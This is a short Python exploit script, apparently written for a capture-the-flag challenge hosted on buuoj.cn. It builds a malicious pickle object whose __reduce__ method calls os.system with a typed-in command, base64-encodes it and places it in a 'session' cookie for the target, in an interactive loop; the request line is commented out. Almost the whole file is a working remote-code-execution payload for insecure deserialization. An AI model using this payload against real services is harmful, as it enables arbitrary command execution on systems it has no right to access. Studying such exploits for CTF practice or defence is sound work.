import time
import pickle

p = 'gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'
import base64

p = base64.b64decode(p)
print(pickle.loads(p))


class c(object):
    def __init__(self, x=''):
        self.cmd = x

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))


u = 'http://258ff72c-f3d2-4267-9fbb-8598eb7b513c.node3.buuoj.cn/'

while True:
    cmd = input("cmd>")
    d = base64.b64encode(pickle.dumps(c(cmd)))
    print(d)
    cookie = {"session": d.decode()}
    dat = {"id": "-1"}
    print(base64.b64decode(d))
    # print(requests.post(u,data=dat,cookies=cookie))
